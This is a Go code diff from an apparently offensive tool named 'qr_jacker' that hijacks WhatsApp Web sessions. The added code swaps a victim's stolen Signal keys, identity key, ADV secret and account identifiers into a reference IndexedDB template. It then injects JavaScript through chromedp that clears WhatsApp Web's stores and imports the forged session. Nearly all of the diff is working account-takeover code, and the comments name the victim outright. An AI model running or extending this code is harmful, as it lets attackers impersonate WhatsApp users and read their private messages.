@@ -162,6 +162,26 @@ func ReplayInBrowser(sd *sessionData) error {
 	os.Unsetenv("DISPLAY")
 	sudoFixEnv()
 
+	// Load reference post-pairing template
+	templateData, err := os.ReadFile("scripts/qr_jacker/whatsapp/reference/post_pairing.json")
+	if err != nil {
+		return fmt.Errorf("load reference template: %w", err)
+	}
+
+	var template interface{}
+	if err := json.Unmarshal(templateData, &template); err != nil {
+		return fmt.Errorf("parse reference template: %w", err)
+	}
+
+	// Replace crypto keys in the template with victim's keys
+	replaceKeysInTemplate(template, sd)
+
+	// Serialize modified template back to JSON
+	modifiedTemplate, err := json.Marshal(template)
+	if err != nil {
+		return fmt.Errorf("serialize modified template: %w", err)
+	}
+
 	userDir, err := os.MkdirTemp("", "whatsapp-replay-*")
 	if err != nil {
 		return err
@@ -178,28 +198,12 @@ func ReplayInBrowser(sd *sessionData) error {
 	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
 		return err
 	}
-	// Wait for the page to render QR (means IndexedDB is initialized with keys)
 	if err := chromedp.Run(ctx, chromedp.WaitVisible("canvas", chromedp.ByQuery)); err != nil {
 		return fmt.Errorf("wait QR: %w", err)
 	}
 	time.Sleep(2 * time.Second)
 
-	dump, err := evalDump(ctx)
-	if err != nil {
-		return fmt.Errorf("dump: %w", err)
-	}
-
-	// Save debug dump
-	if f, err := os.Create(filepath.Join(os.TempDir(), "whatsapp_dump.json")); err == nil {
-		var v interface{}
-		json.Unmarshal([]byte(dump), &v)
-		d, _ := json.MarshalIndent(v, "", "  ")
-		f.Write(d)
-		f.Close()
-		fmt.Printf("[*] Debug dump saved to /tmp/whatsapp_dump.json\n")
-	}
-
-	injectJS := genInjectJS(dump, sd)
+	injectJS := genTemplateInjectJS(string(modifiedTemplate))
 
 	var result string
 	if err := chromedp.Run(ctx, chromedp.Evaluate(injectJS, &result, func(p *runtime.EvaluateParams) *runtime.EvaluateParams {
@@ -217,54 +221,228 @@ func ReplayInBrowser(sd *sessionData) error {
 	return nil
 }
 
-func genInjectJS(_ string, sd *sessionData) string {
-	// IndexedDB stores ADV secret key as base64 string, not raw bytes
+func replaceKeysInTemplate(t interface{}, sd *sessionData) {
+	dbs, ok := t.([]interface{})
+	if !ok {
+		return
+	}
 	advB64 := base64.StdEncoding.EncodeToString(sd.AdvSecretKey)
 
+	for _, dbi := range dbs {
+		db, ok := dbi.(map[string]interface{})
+		if !ok {
+			continue
+		}
+		stores, _ := db["stores"].([]interface{})
+
+		for _, si := range stores {
+			s, ok := si.(map[string]interface{})
+			if !ok {
+				continue
+			}
+			name, _ := s["name"].(string)
+			entries, _ := s["entries"].([]interface{})
+
+			switch name {
+			case "signal-meta-store":
+				for _, ei := range entries {
+					e, ok := ei.(map[string]interface{})
+					if !ok {
+						continue
+					}
+					v, _ := e["v"].(map[string]interface{})
+					if v == nil {
+						continue
+					}
+					keyName, _ := v["key"].(string)
+					switch keyName {
+					case "signal_static_privkey":
+						setNestedBytes(v, sd.NoisePriv, "value", "value")
+					case "signal_static_pubkey":
+						setNestedBytes(v, sd.NoisePub, "value", "value")
+					case "signal_reg_id":
+						v["value"] = float64(sd.RegistrationID)
+					}
+				}
+
+			case "signed-prekey-store":
+				for _, ei := range entries {
+					e, _ := ei.(map[string]interface{})
+					if e == nil {
+						continue
+					}
+					v, _ := e["v"].(map[string]interface{})
+					if v == nil {
+						continue
+					}
+					v["keyId"] = float64(sd.SignedPreKeyID)
+					if kp, _ := v["keyPair"].(map[string]interface{}); kp != nil {
+						kp["privKey"] = bytesToBJSON(sd.SignedPrePriv)
+						kp["pubKey"] = bytesToBJSON(sd.SignedPrePub)
+					}
+					v["signature"] = bytesToBJSON(sd.SignedPreSig)
+				}
+
+			case "user-prefs":
+				for _, ei := range entries {
+					e, _ := ei.(map[string]interface{})
+					if e == nil {
+						continue
+					}
+					v, _ := e["v"].(map[string]interface{})
+					if v == nil {
+						continue
+					}
+					if keyName, _ := v["key"].(string); keyName == "WAADVSecretKey" {
+						v["value"] = advB64
+					}
+				}
+
+			case "identity-store":
+				// Add/replace own identity entry for the victim's JID
+				ownJID := fmt.Sprintf("%s@lid.0", sd.JIDUser)
+				found := false
+				for _, ei := range entries {
+					e, _ := ei.(map[string]interface{})
+					if e == nil {
+						continue
+					}
+					if k, _ := e["k"].(string); k == ownJID {
+						v, _ := e["v"].(map[string]interface{})
+						if v != nil {
+							v["identifier"] = ownJID
+							// identityKey is stored as 33 bytes (0x05 prefix + 32-byte pub)
+							ik := append([]byte{5}, sd.IdentityPub...)
+							v["identityKey"] = bytesToBJSON(ik)
+							found = true
+						}
+						break
+					}
+				}
+				if !found {
+					// Add new entry
+					ik := append([]byte{5}, sd.IdentityPub...)
+					entries = append(entries, map[string]interface{}{
+						"k": ownJID,
+						"v": map[string]interface{}{
+							"identifier":   ownJID,
+							"identityKey": bytesToBJSON(ik),
+						},
+					})
+					s["entries"] = entries
+				}
+
+			case "session-store":
+				for _, ei := range entries {
+					e, _ := ei.(map[string]interface{})
+					if e == nil {
+						continue
+					}
+					v, _ := e["v"].(map[string]interface{})
+					if v == nil {
+						continue
+					}
+					ownJID := fmt.Sprintf("%s@lid.0", sd.JIDUser)
+					e["k"] = ownJID
+					v["address"] = ownJID
+				}
+
+			case "device-list":
+				for _, ei := range entries {
+					e, _ := ei.(map[string]interface{})
+					if e == nil {
+						continue
+					}
+					k, _ := e["k"].(string)
+					// Replace keys that contain the reference JID with victim's JID
+					if strings.Contains(k, "@lid") {
+						parts := strings.SplitN(k, "@", 2)
+						if len(parts) == 2 {
+							e["k"] = fmt.Sprintf("%s@%s", sd.JIDUser, parts[1])
+						}
+					}
+					// Replace JID-user inside value fields
+					if v, _ := e["v"].(map[string]interface{}); v != nil {
+						replaceJIDInValue(v, sd.JIDUser)
+					}
+				}
+			}
+		}
+	}
+}
+
+func setNestedBytes(v map[string]interface{}, data []byte, keys ...string) {
+	current := v
+	for i, k := range keys {
+		if i == len(keys)-1 {
+			current[k] = bytesToBJSON(data)
+			return
+		}
+		next, _ := current[k].(map[string]interface{})
+		if next == nil {
+			next = make(map[string]interface{})
+			current[k] = next
+		}
+		current = next
+	}
+}
+
+func bytesToBJSON(b []byte) map[string]interface{} {
+	arr := make([]interface{}, len(b))
+	for i, v := range b {
+		arr[i] = float64(v)
+	}
+	return map[string]interface{}{"_b": arr}
+}
+
+func replaceJIDInValue(v map[string]interface{}, newJIDUser string) {
+	refJIDUser := "256315209330757"
+	for key, val := range v {
+		if s, ok := val.(string); ok {
+			if strings.Contains(s, refJIDUser) {
+				v[key] = strings.ReplaceAll(s, refJIDUser, newJIDUser)
+			}
+		}
+	}
+}
+
+func genTemplateInjectJS(templateJSON string) string {
 	return fmt.Sprintf(`(async()=>{
-const Npub=new Uint8Array(%[1]s), Npriv=new Uint8Array(%[2]s);
-const Spub=new Uint8Array(%[3]s), Spriv=new Uint8Array(%[4]s), Ssig=new Uint8Array(%[5]s);
-const Rid=%[6]d, SkeyId=%[7]d;
-const Adv=%q;
-const dbs=await indexedDB.databases();let r=0;
-for(const i of dbs){
-  const db=await new Promise((res,rej)=>{const r=indexedDB.open(i.name);r.onsuccess=e=>res(e.target.result);r.onerror=e=>rej(e.target.error)});
-  for(const sn of db.objectStoreNames){
-    const tx=db.transaction(sn,'readwrite'),st=tx.objectStore(sn);
+const T=%s;
+function m(v){
+  if(v===null||v===undefined)return v;
+  if(typeof v==='number'||typeof v==='string'||typeof v==='boolean')return v;
+  if(Array.isArray(v))return v.map(m);
+  if(v._b!==undefined&&Array.isArray(v._b))return new Uint8Array(v._b);
+  const o={};
+  for(const k of Object.getOwnPropertyNames(v))o[k]=m(v[k]);
+  return o;
+}
+let r=0;
+for(const dbInfo of T){
+  const db=await new Promise((res,rej)=>{const r=indexedDB.open(dbInfo.name);r.onsuccess=e=>res(e.target.result);r.onerror=e=>rej(e.target.error)});
+  for(const storeInfo of dbInfo.stores){
+    const entries=storeInfo.entries;
+    if(!entries||!entries.length)continue;
+    const tx=db.transaction(storeInfo.name,'readwrite'),st=tx.objectStore(storeInfo.name);
     await new Promise((res,rej)=>{
-      const c=st.openCursor();
-      c.onsuccess=e=>{
-        const cur=e.target.result;
-        if(!cur){res();return;}
-        const v=cur.value, k=cur.key;
-        // signal-meta-store entries have string keys matching the entry name
-        if(typeof k==='string'){
-          if(k==='signal_static_privkey'){v.value.value=Npriv;cur.update(v);r++;}
-          else if(k==='signal_static_pubkey'){v.value.value=Npub;cur.update(v);r++;}
-          else if(k==='signal_reg_id'){v.value=Rid;cur.update(v);r++;}
-          else if(k==='WAADVSecretKey'){v.value=Adv;cur.update(v);r++;}
+      const c=st.clear();
+      c.onsuccess=async()=>{
+        for(const e of entries){
+          try{
+            const ev=m(e.v);
+            await new Promise((r2,rj2)=>{const p=st.put(ev,e.k);p.onsuccess=()=>{r++;r2()};p.onerror=x=>rj2(x.target.error)});
+          }catch(x){}
         }
-        // signed-prekey-store: {keyId, keyPair:{privKey,pubKey}, signature}
-        if(v&&typeof v==='object'&&v.keyPair&&v.signature instanceof Uint8Array){
-          v.keyId=SkeyId;
-          v.keyPair.privKey=Spriv;
-          v.keyPair.pubKey=Spub;
-          v.signature=Ssig;
-          cur.update(v);r++;
-        }
-        cur.continue();
+        res();
       };
-      c.onerror=e=>rej(e.target.error);
+      c.onerror=e=>{rej(e.target.error)};
     });
   }
   db.close();
 }
-return "OK: "+r+" keys replaced";
-})()`,
-		bjs(sd.NoisePub), bjs(sd.NoisePriv),
-		bjs(sd.SignedPrePub), bjs(sd.SignedPrePriv), bjs(sd.SignedPreSig),
-		sd.RegistrationID, sd.SignedPreKeyID,
-		advB64)
+return "OK: "+r+" entries imported";
+})()`, templateJSON)
 }
 
 func bjs(b []byte) string {
